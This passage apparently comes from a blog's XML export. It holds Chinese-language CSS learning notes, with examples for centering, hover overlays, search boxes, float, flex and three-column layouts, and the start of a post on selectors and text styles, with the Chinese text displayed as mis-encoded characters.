    <content type="text"><![CDATA[Êé•‰∏ä‰∏ÄÁØáÊñáÁ´†ÔºåÂ≠¶‰π†css‰∏≠Ë∏©ÁöÑÂùëÔºå‰∏Ä‰∫õÂ∞èÁöÑÁü•ËØÜÁÇπÊ±áÊÄªÔºåwikiÁöÑÂâçÁ´ØËÆæËÆ°‰πüÊÄªÁÆóÊòØÂèØ‰ª•Âëä‰∏ÄÊÆµËêΩ‰∫ÜÔºåÊïàÊûúÂõæÔºö Ê∞¥Âπ≥/ÂûÇÁõ¥Â±Ö‰∏≠ÊÄªÁªìÔºöË°åÂÜÖÂÖÉÁ¥†: Áî®text-align:centerÂ±Ö‰∏≠ÔºåÁî®line-heightÂûÇÁõ¥Â±Ö‰∏≠Ôºõ ÂùóÁä∂ÂÖÉÁ¥†: Áî®margin: 0 autoÊ∞¥Âπ≥Â±Ö‰∏≠ÔºåÂûÇÁõ¥Â±Ö‰∏≠Áî®Ôºödisplay:table-cell; vertical-align:middle„ÄÇÂ¶ÇÊûúÂ∑≤ËÆæÂùóÁä∂ÂÖÉÁ¥†È´òÂ∫¶ÔºåÂèØ‰ª•Â∞Ümargin-topÂíåmargin-bottomËÆæ‰∏∫Ôºö(Áà∂ÂÖÉÁ¥†È´òÂ∫¶-Â≠êÂÖÉÁ¥†È´òÂ∫¶)/2Ôºõ Ê∞¥Âπ≥ÂûÇÁõ¥ÂêåÊó∂Â±Ö‰∏≠ËøòÊúâ‰∏ÄÁßçÂäûÊ≥ïÔºåÂ∞ÜÁà∂ÂÖÉÁ¥†positionËÆæ‰∏∫relativeÔºåËØ•ÂÖÉÁ¥†ËÆæ‰∏∫absoluteÔºåÁÑ∂Âêémargin:autoÂç≥ÂèØ„ÄÇ other:ÂÆûÈôÖÂºÄÂèë‰∏≠ÈÅáÂà∞ÁöÑ‰∏Ä‰∏™ÈóÆÈ¢òÔºå‰ΩøÁî®‰∫ÜÁªùÂØπÂÆö‰Ωç‰∫§ÂèâËΩ¥‰ΩçÁΩÆ(ËÆæÁΩÆ‰∫Ütop),Â¶ÇÊûúÊ≠§Êó∂ÊÉ≥ÂÆûÁé∞Âú®Ê∞¥Âπ≥Ëá™Âä®ÂÆö‰ΩçÁöÑËØùÔºåÂæóÁªô‰ªñÂä†‰∏Ä‰∏™Â≠êÊ†áÁ≠æÔºåÁÑ∂ÂêéÁî®margin: 0 auto,Áà∂Ê†áÁ≠æËÆ∞ÂæóËÆæÁΩÆÂÆΩÂ∫¶width: 100% ËøòÊúâ‰∏ÄÁßçÂäûÊ≥ïÂç≥,Â≠êÁõíÂ≠êËÆæÁôæÂàÜÊØîÂÆΩÈ´òÔºåËæπË∑ùÁî®Áõ∏ÂØπÁöÑpositionË∞ÉÊï¥123456789101112.feature-3&#123; width: 100%; height: 1000px; &#125;.feature-3 .feature-box&#123; width: 72%; height: 90%; margin: 0 auto; position: relative; top: 25px;&#125; ÂèÇËÄÉÔºö https://www.cnblogs.com/chaixiaozhi/p/8490725.html inputÊ†áÁ≠æÈÄèÊòébackground-color: transparent; ËÉåÊôØÂõæÈ´òÂ∫¶Ëá™ÈÄÇÂ∫îÈóÆÈ¢òÊàë‰ª¨ÊÉ≥ËÆ©‰∏Ä‰∏™ËÉåÊôØÂõæÁ∫µÂêëÂ°´ÂÖÖÊï¥‰∏™Â±èÂπï, Ë¶ÅÂÖàÂ∞ÜÂÖ∂Áà∂ÂÖÉÁ¥†ÂÖ®ÈÉ®‰ΩøÁî®È´òÂ∫¶100%Ëá™ÈÄÇÂ∫îÔºåËøôÊ†∑Â≠êÂÖÉÁ¥†Êâç‰ºöÁîüÊïà12345678910html,body&#123; height: 100%;&#125;.menu&#123; height: 100%; width: 100px; background: url(&apos;image/Base.png&apos;); &#125; Â≠ó‰ΩìÂõæÁâáÂú®ÂàóË°®‰∏≠ÂØπ‰∏çÈΩêÊó∂ ÁªôÊØè‰∏™ÂõæÊåáÂÆöÂÆΩÂ∫¶ÔºåÂûÇÁõ¥Â±Ö‰∏≠Âç≥ÂèØ12345678910111213img&#123; width: 18px; vertical-align:middle;//ÊåáÂÆöË°åÂÜÖÂÖÉÁ¥†ÔºàinlineÔºâÊàñË°®Ê†ºÂçïÂÖÉÊ†ºÔºàtable-cellÔºâÂÖÉÁ¥†ÁöÑÂûÇÁõ¥ÂØπÈΩêÊñπÂºè„ÄÇ margin-right: 5px;&#125;&lt;dl&gt; &lt;dt&gt;YOUR PEODUCTS &lt;img src=&quot;image/Settings.png&quot; alt=&quot;&quot;&gt;&lt;/dt&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Book of Wisdom.png&quot; alt=&quot;&quot;&gt; Book&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Video Camera.png&quot; alt=&quot;&quot;&gt; Tutorials&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Chart.png&quot; alt=&quot;&quot;&gt; Stocks&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Painting.png&quot; alt=&quot;&quot;&gt; Infographics&lt;/a&gt;&lt;/dd&gt;&lt;/dl&gt; Â∞ÜÈùûÂèØÁÇπÂáªÁöÑÂÖÉÁ¥†ËÆæÁΩÆÊÇ¨ÂÅúÁî±Èº†Ê†áÊåáÈíàÂèòÊàêÊâãcursor: pointer; ÊêúÁ¥¢Ê°ÜÂÜôÊ≥ï12345678910111213141516171819202122232425262728293031323334353637383940.search&#123; height: 70px; width: 100%; border-bottom: 1px solid #ccc; border-right: 1px solid #ccc; position: absolute; top:0;&#125;.search .search-box&#123; display: block; width: 340px; height: 35px; margin: 0 auto; margin-top: 17.5px; /*Â±Ö‰∏≠ÁöÑÂè¶Â§ñ‰∏ÄÁßçÂÜôÊ≥ïÔºå(Áà∂ÂÖÉÁ¥†È´ò-Â≠êÂÖÉÁ¥†È´ò)/2*/ margin-bottom: 17.5px; border: 1px solid rgba(0, 0, 0, 0.1); border-radius: 8px; text-indent: 1em; &#125;.search .search-box .m-search&#123; height: 100%; width: 85%; outline: none; /*ÂÖ≥Èó≠ËÅöÁÑ¶Êó∂ÁöÑÂ§ñÊ°Ü*/&#125;.search .search-box img&#123; width: auto; height: auto; position: relative; top:3px; left: 2px; cursor: pointer; /*ÊÇ¨ÂÅúÂèòÊàêÂ∞èÊâã*/&#125;&lt;div class=&quot;search&quot;&gt; &lt;div class=&quot;search-box&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;m-search&quot; placeholder=&quot;Search&quot;&gt; &lt;img src=&quot;image/Search icon.png&quot; alt=&quot;&quot;&gt; &lt;/div&gt;&lt;/div&gt; ÁªôÂõæÁâáÂä†ÊÇ¨ÊµÆÈò¥ÂΩ±ÊïàÊûú ‰∏§‰∏™ÂõæÁâáÊîæÂÖ•Âêå‰∏Ä‰∏™Áà∂ÁõíÂ≠êÔºåÂ∞ÜhoverÊïàÊûúÂõæÂà©Áî®ÂÆö‰ΩçÔºåÂÆö‰ΩçÂà∞ÂíåÂàùÂßãÂõæ‰∏Ä‰∏™‰ΩçÁΩÆÔºåËÆæÂ•ΩhoverÊïàÊûúÂõæÂàùÂßã‰∏∫‰∏çÂèØËßÅÔºåÁÑ∂ÂêéÁî®:hoverÊîπÂèòÈÄèÊòéÂ∫¶„ÄÇ 1234567891011121314151617181920.team-name&#123; margin: 10px 10px; position: relative;&#125;.team-name .cover&#123; opacity: 0; /*Â∞ÜË¶ÜÁõñÁöÑÂõæËÆæ‰∏∫‰∏çÂèØËßÅ*/ position: absolute; /*Â∞ÜË¶ÜÁõñÂõæÂíåÂéüÂßãÂõæÂÆö‰ΩçÂà∞Âêå‰∏Ä‰∏™‰ΩçÁΩÆ*/ top: 0; bottom: 0; left: 0; right: 0; z-index: 1;&#125;.team-name:hover .cover&#123; opacity: 0.9; &#125;&lt;div class=&quot;team-name&quot;&gt; &lt;img src=&quot;images/Userpic-1.jpg&quot; alt=&quot;&quot;&gt;&lt;!--ÂàùÂßãÂõæ--&gt; &lt;div&gt;&lt;img class=&quot;cover&quot; src=&quot;images/active.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;!--hoverÂêéË¶ÜÁõñÁöÑÂõæ--&gt;&lt;/div&gt; ÂÆåÊï¥ÊïàÊûúÔºöÊÇ¨ÊµÆÈò¥ÂΩ±ÊïàÊûú.gif ÂÆûÁé∞ËæπÁ∫ø‰∏äÂä†ÊñáÂ≠óÊïàÊûú 1234567891011121314.line&#123; height: 1px; text-align: center; /*ËÆ©span‰∏≠Èó¥ÊñáÂ≠óÂà∞‰∏≠Èó¥*/ border: 1px solid #ccc; &#125;.line span&#123; position: relative; top: -12px; /*ÁßªÂä®Âà∞Á∫ø‰∏ä*/ font-size: 14px; color: #7f8fa4; background: white; padding: 0 20px; &#125; &lt;div class=&quot;line&quot;&gt;&lt;span&gt;‚Üë ÂÆâÂÖ®ÂÆ¢Êé®ÈÄÅ ‚Üë&lt;/span&gt;&lt;/div&gt; Âú®ÂÖÉÁ¥†ÁõíÂ≠êÂâçÂä†‰∏äÂ∞èÂÖâÁÇπ‰ΩøÁî®::before‰º™ÂÖÉÁ¥†Ôºå‰ΩøÁî®Ë¥üÁöÑleftÁßªÂà∞ÁõíÂ≠êÂâçÈù¢„ÄÇ123456789101112.choose::before&#123; content: &quot;&quot;; position: absolute; border-radius: 100px; display: block; box-shadow: 1px 0 5px 2px #214e74; width: 2px; height: 4px; background-color: #2399f1; top: 60px; left: -29px; &#125; Â∑¶Âè≥‰∏§Ê†èÂõ∫ÂÆöÂ∏ÉÂ±ÄÊñπÊ≥ï ‰ΩøÁî®floatÂ∏ÉÂ±Ä 1234567891011121314 .left-float&#123; float: left; width: 30%; height: 100px; background: rgb(17, 0, 255); &#125; .right-float&#123; float:right; width: 70%; height: 100px; background: rgb(77, 209, 77); &#125;&lt;div class=&quot;left-float&quot;&gt;left-float/div&gt;&lt;div class=&quot;right-float&quot;&gt;right-float&lt;/div&gt; ‰ΩøÁî®flexËøõË°åÂ∏ÉÂ±Ä(Â•ΩÁî®ÔºÅ) 12345678910111213141516.flex&#123; display: flex;&#125;.left-flex&#123; flex:3; background:hotpink&#125;.right-flex&#123; flex:7; background:khaki;&#125;&lt;div class=&quot;flex&quot;&gt; &lt;div class=&quot;left-flex&quot;&gt;left-flex&lt;/div&gt; &lt;div class=&quot;right-flex&quot;&gt;right-flex&lt;/div&gt;&lt;/div&gt; ‰ΩøÁî®ÁªùÂØπÂÆö‰ΩçÂ∏ÉÂ±Ä(‰∏çÊé®Ëçê) 1234567891011121314151617.left-position&#123; position:absolute; top: 100px; left: 0; width: 30%; background:rgb(0, 140, 255);&#125;.right-position&#123; position:absolute; right: 0; top: 100px; width:70%; background: rgb(202, 127, 30);&#125;&lt;div class=&quot;left-position&quot;&gt;left-position&lt;/div&gt;&lt;div class=&quot;right-position&quot;&gt;right-position&lt;/div&gt; Â∑¶Âõ∫ÂÆöÂè≥Âä®ÊÄÅÁöÑ‰∏§ÂàóÂ∏ÉÂ±Ä float+BFCÊñπÊ≥ï123456789101112131415.left-float&#123; float: left; width:200px; height: 500px; color: black; background: rgb(228, 139, 23);&#125;.right-float&#123; background: red; height: 500px; margin-left: 205px;&#125;&lt;div class=&quot;left-float&quot;&gt;left&lt;/div&gt;&lt;div class=&quot;right-float&quot;&gt;right&lt;/div&gt; absolute + margin-left 1234567891011121314 .left-absolute&#123; position: absolute; width: 200px; height: 500px; left:0; background: rgb(255, 187, 0); &#125; .right-absolute&#123; margin-left: 205px; height: 500px; background: red; &#125;&lt;div class=&quot;left-absolute&quot;&gt;left-absolute&lt;/div&gt;&lt;div class=&quot;right-absolute&quot;&gt;right-absolute&lt;/div&gt; flex(Â•ΩÁî®ÔºÅ) 12345678910111213.left-flex&#123; flex: 0 0 200px; background: red; &#125;.right-flex&#123; flex: 1 1 auto; background: green;&#125;&lt;div class=&quot;flex&quot;&gt; &lt;div class=&quot;left-flex&quot;&gt;left-flex&lt;/div&gt; &lt;div class=&quot;right-flex&quot;&gt;right-flex&lt;/div&gt;&lt;/div&gt; flex: 0 0 200pxÔºöË°®Á§∫ÂÄº‰∏∫Âõ∫ÂÆö200pxÔºå‰∏çÂíåÂÖ∂‰ªñÂÖÉÁ¥†ÊàêÊØî‰æãÂÖ≥Á≥ªÔºåÂêåÊó∂ÂÆΩÂ∫¶‰∏çÂ§üÊó∂‰πü‰∏ç‰ºöÊî∂Áº©ÔºåÂç≥Âõ∫ÂÆö„ÄÇ margin ‰∏∫Ë¥üÂÄºÁöÑÁî®Ê≥ï marginÁöÑÂèÇËÄÉÁ∫øÊúâ‰∏§Á±ªÔºå‰∏ÄÁ±ªÊòØtop„ÄÅleftÔºåÂÆÉ‰ª¨‰ª•Â§ñÂÖÉÁ¥†‰Ωú‰∏∫ÂèÇËÄÉÁ∫øÔºåÂè¶‰∏ÄÁ±ªÊòØright„ÄÅbottomÔºåÂÆÉ‰ª¨‰ª•Ëá™Ë∫´‰Ωú‰∏∫ÂèÇËÄÉÁ∫ø„ÄÇÁÆÄÂçïÁÇπËØ¥Â∞±ÊòØÔºö topË¥üÂÄºÂ∞±ÊòØ‰ª•ÂåÖÂê´Âùó(Containing block) ÂÜÖÂÆπÂå∫ÂüüÁöÑ‰∏äËæπÊàñËÄÖ‰∏äÊñπÁõ∏ËøûÂÖÉÁ¥† margin ÁöÑ‰∏ãËæπ‰∏∫ÂèÇËÄÉÁ∫ø; leftË¥üÂÄºÂ∞±ÊòØ‰ª•ÂåÖÂê´Âùó(Containing block) ÂÜÖÂÆπÂå∫ÂüüÁöÑÂ∑¶ËæπÊàñËÄÖÂ∑¶ÊñπÁõ∏ËøûÂÖÉÁ¥† margin ÁöÑÂè≥Ëæπ‰∏∫ÂèÇËÄÉÁ∫ø; rightË¥üÂÄºÂ∞±ÊòØ‰ª•ÂÖÉÁ¥†Êú¨Ë∫´borderÁöÑÂè≥Ëæπ‰∏∫ÂèÇËÄÉÁ∫øÔºõ bottomË¥üÂÄºÂ∞±ÊòØ‰ª•ÂÖÉÁ¥†Êú¨Ë∫´borderÁöÑ‰∏ãËæπ‰∏∫ÂèÇËÄÉÁ∫øÔºõ ÂèåÈ£ûÁøºÂ∏ÉÂ±ÄÂç≥‰∏âÊ†èÂ∏ÉÂ±ÄÔºå‰∏§ËæπÁõíÂ≠êÂõ∫ÂÆöÔºå‰∏≠Èó¥ÁõíÂ≠êËá™ÈÄÇÂ∫îÁöÑÂ∏ÉÂ±Ä123&lt;div class=&quot;col-main&quot;&gt;ÊàëÊòØ‰∏ªÂàó&lt;/div&gt;&lt;div class=&quot;col-sub&quot;&gt;ÊàëÊòØÂ≠êÂàó&lt;/div&gt;&lt;div class=&quot;col-extra&quot;&gt;ÊàëÊòØÈôÑÂä†Âàó&lt;/div&gt; ËøôÊ†∑ÂÜôdomÔºåÊµèËßàÂô®Âä†ËΩΩÈ°∫Â∫è‰æùÊ¨°‰∏∫Ôºö‰∏ªÂàó„ÄÅÂ≠êÂàó„ÄÅÈôÑÂä†Âàó„ÄÇ‰ΩÜÊòØÊàë‰ª¨Ë¶ÅÁöÑÊïàÊûúÊòØÂ∑¶Ëæπ‰∏∫Â≠êÂàóÔºå‰∏≠Èó¥‰∏∫‰∏ªÂàóÔºåÂè≥Ëæπ‰∏∫ÈôÑÂä†Âàó„ÄÇ ËÄå‰∏îÊàë‰ª¨Ë¶ÅÁöÑÊïàÊûúÊòØÂ∑¶Âè≥‰∏§ËæπÁõíÂ≠êÂÆΩÂ∫¶Âõ∫ÂÆöÔºå‰∏≠Èó¥Ëá™ÈÄÇÂ∫î(width:100%)ÔºåÁº©ÊîæÈ°µÈù¢Êó∂ÂÆΩÂ∫¶‰∏çÂ∞è‰∫é700px(ÁªôbodyÂä†‰∏™ÊúÄÂ∞èÂÆΩÂ∫¶) ËøôÈáåÂèØ‰ª•‰ΩøÁî®margin‰∏∫Ë¥üÁöÑÂ∏ÉÂ±ÄÔºå‰ΩøÂæó‰∏ªÂàóÂú®‰∏≠Èó¥ÔºåÂ≠êÂàóÂíåÈôÑÂä†ÂàóÂú®Â∑¶Âè≥„ÄÇ1234567891011121314151617181920212223.col-main&#123; float: left; width: 100%; background:red;&#125;.col-sub&#123; float: left; width: 190px; margin-left: -100%; background:green;&#125;.col-extra&#123; float: left; width: 190px; margin-left: -190px; background: blue;&#125;&lt;div class=&quot;demo&quot;&gt; &lt;div class=&quot;col-main&quot;&gt;ÊàëÊòØ‰∏ªÂàó&lt;/div&gt; &lt;div class=&quot;col-sub&quot;&gt;ÊàëÊòØÂ≠êÂàó&lt;/div&gt; &lt;div class=&quot;col-extra&quot;&gt;ÊàëÊòØÈôÑÂä†Âàó&lt;/div&gt;&lt;/div&gt; ÂàùÊ≠•ÁöÑÂ∏ÉÂ±ÄÂ∑≤ÁªèÊàêÂΩ¢‰∫ÜÔºå‰ΩÜÊòØ‰∏ªÂàóÁöÑÊñáÂ≠óË¢´Â≠êÂàóÊå°‰Ωè‰∫ÜÔºåËøôÊó∂ÂÄôÂèØËÉΩ‰ºöÊÉ≥ÁùÄÂú®‰∏ªÂàóÁöÑcss‰∏äÂä†margin-leftÔºåÂõ†‰∏∫Êàë‰ª¨Â≠êÂàóÁöÑÂ∏ÉÂ±ÄÊòØÈù†ÁùÄ‰∏ªÂàóÁöÑÂè≥ËæπÁ∫øÂÆö‰ΩçÁöÑÔºåÁõ¥Êé•Âä†ÁöÑËØù‰ºöÂΩ±ÂìçÂà∞Êï¥‰ΩìÂ∏ÉÂ±ÄÔºåËøôÈáåÊúâÂá†ÁßçÂÆûÁé∞ÂäûÊ≥ïÔºö Âú®‰∏ªÂàóÂÜÖÂª∫‰∏Ä‰∏™ÁõíÂ≠êÔºåËÆæÁΩÆËØ•ÁõíÂ≠êÁöÑmargin-left/rightdemo:1234567891011121314151617181920212223242526272829303132.main&#123; float: left; width:100%; height: 600px;; background: rgb(16, 149, 202);&#125;.left&#123; float: left; margin-left: -100%; width: 200px; height: 600px; background: rgb(130, 47, 214);&#125;.right&#123; float: left; width: 200px; margin-left: -200px; height: 600px; background: rgb(255, 217, 0);&#125;.wrap&#123; margin: 0 200px;&#125;body&#123; min-width: 700px; /*ËÆæÁΩÆÊúÄÂ∞èÂÆΩÂ∫¶*/&#125;&lt;!-- ‰ΩøÁî®Áõ∏ÂØπÂÆö‰ΩçÊù•Ëß£ÂÜ≥‰∏≠Èó¥ÁõíÂ≠êÊòæÁ§∫ÈóÆÈ¢ò --&gt;&lt;div class=&quot;main&quot;&gt; &lt;div class=&quot;wrap&quot;&gt;main&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;&lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; ‰ΩøÁî®Áõ∏ÂØπÂÆö‰ΩçÂÖàÁªô‰∏âÂàóÁöÑÁà∂ÂÆπÂô®ËÆæÁΩÆ‰∏Ä‰∏™Â∑¶Âè≥200pxÁöÑpaddingÔºåÂ∞Ü‰∏âÂàóÂéãÊâÅÔºåÁÑ∂ÂêéÁªôÂ∑¶Âè≥ÂàóËÆæ‰∏Ä‰∏™Áõ∏ÂØπÂÆö‰ΩçpaddingÁ©∫Âá∫Êù•ÁöÑ‰ΩçÁΩÆÂ°´Êª°„ÄÇÂç≥ÂèØËÆ©‰∏ªÂàóÂÖÉÁ¥†ÂÖ®ÈÉ®ÊòæÁ§∫Âá∫Êù•„ÄÇ 12345678910111213141516171819202122232425262728293031.col-main&#123; float: left; width: 100%; background:red;&#125;.col-sub&#123; float: left; width: 190px; margin-left: -100%; background:green; position: relative; left: -200px;&#125;.col-extra&#123; float: left; width: 190px; margin-left: -190px; background: blue; position: relative; right:-200px;&#125;.demo&#123; padding: 0 200px;&#125;&lt;div class=&quot;demo&quot;&gt; &lt;div class=&quot;col-main&quot;&gt;ÊàëÊòØ‰∏ªÂàó&lt;/div&gt; &lt;div class=&quot;col-sub&quot;&gt;ÊàëÊòØÂ≠êÂàó&lt;/div&gt; &lt;div class=&quot;col-extra&quot;&gt;ÊàëÊòØÈôÑÂä†Âàó&lt;/div&gt;&lt;/div&gt; ‰∏âÊ†èÂ∏ÉÂ±Ä ‰∏äËø∞ËØ¥ÁöÑÂèåÈ£ûÁøº(marginË¥üÂÄºÊ≥ï)Â∏ÉÂ±Ä ÁªùÂØπÂÆö‰ΩçÊ≥ïÂ∑¶Âè≥ÂÆΩÂ∫¶Âõ∫ÂÆöÔºåÈááÁî®ÁªùÂØπÂÆö‰ΩçÔºå‰∏≠Èó¥‰∏ª‰ΩìÁî®marginÊíëÂºÄ„ÄÇ‰∏çÂ•ΩÁî®„ÄÇ Ëá™Ë∫´ÊµÆÂä®Ê≥ïÂ∑¶Âè≥Ê†áÁ≠æÔºåÂàÜÂà´Â∑¶Âè≥ÊµÆÂä®Ôºå‰∏ªÂàóÊ†áÁ≠æÊîæÊúÄÂêéÂÆûÁé∞Ëá™ÈÄÇÂ∫î„ÄÇ 123456789101112131415161718192021222324html,body&#123; height: 100%; margin: 0;&#125;.left&#123; width: 100px; height: 100%; float: left; background:rgb(223, 85, 21);&#125;.middle&#123; background:rgb(28, 113, 211); height: 100%; margin: 0 120px;&#125;.right&#123; width: 100px; height: 100%; float: right; background: rgb(27, 156, 81);&#125;&lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;&lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;&lt;div class=&quot;middle&quot;&gt;middle(Ëøô‰∏™‰∏ÄÂÆöË¶ÅÊîæÊúÄÂêé)&lt;/div&gt;]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS-ÂâçÁ´ØÂ≠¶‰π†ËÆ∞ÂΩï]]></title>
    <url>%2F2019%2F01%2F29%2FCSS-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[ÊÉ≥‰∏™Â∞èÁªÑwikiÂÜô‰∏™ÁÇ´ÈÖ∑ÁöÑÂâçÁ´ØÔºåËøôÂçä‰∏™ÊúàÊù•‰∏ÄÁõ¥Âú®‰∏çÊñ≠ÁöÑÁªÉ‰π†ÂâçÁ´ØÂºÄÂèëÔºåÂàÜ‰∫´‰∏Ä‰∫õËá™Â∑±Â≠¶‰π†ËøáÁ®ãÁöÑËÆ∞ÂΩï~ ÈÄâÊã©Âô® Ê†áÁ≠æÈÄâÊã©Âô®p{font-size: 12px} Á±ªÈÄâÊã©Âô®.class{font-size: 12px}ÁªëÂÆöÊ†áÁ≠æÁöÑclassÂ±ûÊÄßÔºåÂèØ‰ª•ÈáçÂ§ç IDÈÄâÊã©Âô®#id{font-size: 12px}ÁªëÂÆöÊ†áÁ≠æÁöÑidÂ±ûÊÄßÔºå‰∏çËÉΩÈáçÂ§ç Â≠êÈÄâÊã©Âô®.food&gt;li{border:1px}ÈÄâÊã©foodÁ±ª‰∏≠ÁöÑliÊ†áÁ≠æÔºåÂè™ËÉΩÈÄâÊã©Áõ¥Êé•Âêé‰ª£(Á¨¨‰∏Ä‰ª£Âêé‰ª£) ÂåÖÂê´Âêé‰ª£ÈÄâÊã©Âô®.first span{color:red}Âç≥ÈÄâÊã©firstÁ±ªÈáåÁöÑspanÊ†áÁ≠æÔºåÊâÄÊúâÂêé‰ª£ÈÉΩÂèØ‰ª• ÈÄöÁî®ÈÄâÊã©Âô®* {color: red;} ‰º™ÈÄâÊã©Âô®a:hover{color:red;}Âç≥Èº†Ê†áÊªëËøáÊó∂Ëß¶ÂèëÁöÑÈÄâÊã©Âô®ÔºåËøôÈáå‰ΩøaÊ†áÁ≠æÈáåÁöÑÊñáÂ≠óÂèòÁ∫¢ ÂàÜÁªÑÈÄâÊã©Âô®h1,span{color: red}ÈÄâ‰ΩèÂÖ®ÈÉ®h1ÂíåspanÊ†áÁ≠æ Áõ∏ÈÇªÈÄâÊã©Âô®div+p ÈÄâÊã©Á¥ßÁùÄÂú®&lt;div&gt;ÂÖÉÁ¥†ÂêéÁöÑ&lt;p&gt; Ê≥®ÊÑèÂíåÂåÖÂê´Âêé‰ª£ÈÄâÊã©Âô®/Â≠êÈÄâÊã©Âô®ÁöÑÂå∫Âà´‰∏∫ÔºåÂÆÉ‰ª¨ÈÄâÊã©ÁöÑÊòØÂåÖÂê´Âú®ÂÖ∂‰∏≠ÁöÑÂÖÉÁ¥†ÔºåËÄå+Âè∑ÈÄâÊã©Âô®ÈÄâÊã©ÁöÑÊòØÂêåÁ∫ßÂà´ÂÖ≥Á≥ªÁöÑ ÈÄöÁî®ÈÄâÊã©Âô®A ~ B:ÂåπÈÖçBÂÖÉÁ¥†ÔºåBÊòØA‰πãÂêéÂÖÑÂºüËäÇÁÇπ‰∏≠‰ªªÊÑè‰∏Ä‰∏™„ÄÇ ÊñáÊú¨Ê†∑ÂºèÔºö Â≠ó‰Ωìfont-family: &quot;ÂÆã‰Ωì&quot;;font-family:&quot;Microsoft Yahei&quot;; Â≠óÂè∑font-size: 12pxÂ≠ó‰ΩìÂ§ßÂ∞èÂçï‰ΩçÊúâÔºö pxÔºöÂÉèÁ¥†ÂÄºÔºåÁªùÂØπÂçï‰Ωç emÔºö1emÁõ∏ÂΩì‰∫éÂΩìÂâçÂÖÉÁ¥†ÁöÑÁà∂ÂÖÉÁ¥†ÁöÑÂ§ßÂ∞è rem: 1remÁõ∏ÂØπ‰∫éÊ†πÂÖÉÁ¥†()ÁöÑÂ≠ó‰ΩìÂ§ßÂ∞è ÊâÄ‰ª•‰∏ÄËà¨Êàë‰ª¨Â∞Ü&lt;html&gt;ÂÖÉÁ¥†ÁöÑfont-sizeËÆæ‰∏∫‰∏Ä‰∏™Âõ∫ÂÆöÁöÑpxÂÄºÔºå‰πãÂêéÁöÑÊÆµËêΩÂü∫‰∫éremÊù•ÂèòÂåñÂç≥ÂèØ„ÄÇ 3.È¢úËâ≤color: red Á≤ó‰ΩìÂ§ßÂ∞èfont-weight: normal | bold | lighter | border normal: ÊôÆÈÄö bold: Âä†Á≤ó Êõ¥ÁªÜÊàñÊõ¥Á≤ó Â≠ó‰ΩìÊ†∑Âºèfont-style: normal | italic | oblique normal: ËÆæÁΩÆ‰∏∫ÊôÆÈÄöÂ≠ó‰Ωì(Ëã•Â≠òÂú®Êñú‰ΩìÂàôÂÖ≥Èó≠) italic: ËÆæÁΩÆÊñú‰Ωì ÊñáÊú¨Ë£ÖÈ•∞text-decoration:line-throughÂèÇÊï∞Ôºönone ÈªòËÆ§„ÄÇÂÆö‰πâÊ†áÂáÜÁöÑÊñáÊú¨„ÄÇunderline ÂÆö‰πâÊñáÊú¨‰∏ãÁöÑ‰∏ÄÊù°Á∫ø„ÄÇoverline ÂÆö‰πâÊñáÊú¨‰∏äÁöÑ‰∏ÄÊù°Á∫ø„ÄÇline-through ÂÆö‰πâÁ©øËøáÊñáÊú¨‰∏ãÁöÑ‰∏ÄÊù°Á∫ø„ÄÇblink ÂÆö‰πâÈó™ÁÉÅÁöÑÊñáÊú¨„ÄÇinherit ËßÑÂÆöÂ∫îËØ•‰ªéÁà∂ÂÖÉÁ¥†ÁªßÊâø text-decoration Â±ûÊÄßÁöÑÂÄº„ÄÇ demoÔºöÂêåÊó∂Ê∑ªÂä†‰∏ä‰∏ãÂàíÁ∫ø1text-decoration: underline overline; Â≠ó‰ΩìËΩ¨Êç¢text-transform: none | uppercase | lowercase | capitalize | full-width none: Èò≤Ê≠¢‰ªª‰ΩïËΩ¨Âûã„ÄÇ uppercase: Â∞ÜÊâÄÊúâÊñáÊú¨ËΩ¨‰∏∫Â§ßÂÜô„ÄÇ lowercase: Â∞ÜÊâÄÊúâÊñáÊú¨ËΩ¨‰∏∫Â∞èÂÜô„ÄÇ capitalize: ËΩ¨Êç¢ÊâÄÊúâÂçïËØçËÆ©ÂÖ∂È¶ñÂ≠óÊØçÂ§ßÂÜô„ÄÇ full-width: Â∞ÜÊâÄÊúâÂ≠óÂΩ¢ËΩ¨Êç¢ÊàêÂõ∫ÂÆöÂÆΩÂ∫¶ÁöÑÊ≠£ÊñπÂΩ¢ÔºåÁ±ª‰ºº‰∫éÁ≠âÂÆΩÂ≠ó‰ΩìÔºåÂÖÅËÆ∏ÂØπÈΩê„ÄÇÊãâ‰∏ÅÂ≠óÁ¨¶‰ª•Âèä‰∫öÊ¥≤ËØ≠Ë®ÄÂ≠óÂΩ¢ÔºàÂ¶Ç‰∏≠ÊñáÔºåÊó•ÊñáÔºåÈü©ÊñáÔºâ ÂµåÂÖ•Â≠ó‰ΩìÂä†ËΩΩÊúçÂä°Á´ØÁöÑÂ≠ó‰ΩìÊñá‰ª∂ÔºåËÆ©ÊµèËßàÂô®ÂèØ‰ª•ÊòæÁ§∫Áî®Êà∑ÁîµËÑëÊ≤°ÊúâÁöÑÂ≠ó‰Ωì 1234@font-face &#123; font-family : Â≠ó‰ΩìÂêçÁß∞; src : Â≠ó‰ΩìÊñá‰ª∂Âú®ÊúçÂä°Âô®‰∏äÁöÑÁõ∏ÂØπÊàñÁªùÂØπË∑ØÂæÑ;&#125; ÊñáÊú¨Èò¥ÂΩ±text-shadow: X-Offset Y-Offset blur 